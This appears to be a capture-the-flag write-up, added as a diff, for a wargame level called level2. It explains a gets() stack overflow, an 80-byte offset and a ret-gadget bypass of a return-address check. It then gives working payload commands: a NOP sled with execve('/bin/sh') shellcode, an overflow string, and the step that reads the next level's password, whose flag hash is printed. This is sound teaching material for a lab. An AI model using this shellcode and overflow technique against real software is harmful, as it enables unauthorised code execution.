@@ -1,0 +1,59 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗         ██████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ╚════██╗
+██║     █████╗  ██║   ██║█████╗  ██║          █████╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ██╔═══╝ 
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ███████╗
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝    ╚══════╝
+                                                     
+
+objdump -d level2
+
+There is two functions: <main> and <p>
+
+In <p> function there is a call to <gets>, so we can overflow it.
+
+Using the same method as in the previous level, get the offset:
+-> 80
+
+While we were looking for the offset, and by setting some breakpoints, we noticed that the program segfault at the RET instruction of the <p> function.
+
+The goal is to make this RET instruction that segfault, execute a shellcode.
+Unfortunately, the program checks our string at the offset 80, and makes an exit if the address we give him begins with 0xbxxxxxxx.
+
+<+39>:    and    $0xb0000000,%eax
+<+44>:    cmp    $0xb0000000,%eax
+					... 
+<+78>:	  call   0x80483d0 <_exit@plt>
+
+This is a little embarrasing, because we can not store a shellcode (either in an environment variable or in the string directly) in an address that does not start with 0xbxxxxxxx.
+
+Fortunately, the program only performs this verification at the offset 80.
+So we juste have to make the RET instruction execute our address at a different offset.
+
+We know that the RET instruction execute the ESP register (our string at the offset 80).
+
+
+For example : run A * 80 + BBBB
+ 			  will execute -> 0x42424242
+
+The RET statement also performs an pop EBP. 
+Which increments by 4 bytes the address of ESP.
+
+We make a call to the RET instruction so that the 4-byte incrementation allows us to use the offset 84 instead of the 80.
+
+So we have:
+                OFFSET 80 - CALL TO RET - ADDRESS OF OUR SHELLCODE
+
+export SHELLCODE=`python -c "print '\x41\xf8\xff\xbf' + '\x90' * 200 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"
+
+python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x3d\xf8\xff\xbf'" > /tmp/file
+
+cat /tmp/file - | ./level2
+
+cd ../level3 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 |
+|══════════════════════════════════════════════════════════════════|
+
